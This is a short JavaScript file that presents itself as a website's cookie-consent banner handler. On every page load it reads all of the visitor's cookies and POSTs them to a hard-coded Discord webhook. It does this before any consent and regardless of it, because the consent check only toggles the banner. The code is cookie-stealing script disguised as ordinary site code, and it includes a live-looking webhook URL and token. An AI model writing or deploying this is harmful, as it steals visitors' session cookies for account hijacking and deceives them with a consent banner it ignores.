const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8";

function hasAcceptedCookies() {
    return document.cookie.includes("cookieConsent=true");
}

function sendCookiesToWebhook() {
    // Get all current cookies
    const allCookies = document.cookie;

    // Parse the cookie string into an array of key-value pairs
    const cookieArray = allCookies.split(';');

    // Format the cookies for the Discord message
    const formattedCookies = cookieArray.map(cookie => cookie.trim()).join('\n- ');

    // Send all cookies to Discord webhook in a formatted way
    const payload = {
        content: `🍪 Website opened - Current Cookies:\n- ${formattedCookies}`
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    }).catch(err => console.error("Webhook failed:", err));
}

function acceptCookies() {
    // Set cookie to acknowledge acceptance
    document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;

    // Hide banner
    document.getElementById("cookie-banner").style.display = "none";
}

function loadSiteOnLoad() {
    // Send cookies to webhook when the page loads
    sendCookiesToWebhook();

    // Show banner if not already accepted
    if (!hasAcceptedCookies()) {
        document.getElementById("cookie-banner").style.display = "block";
    }
}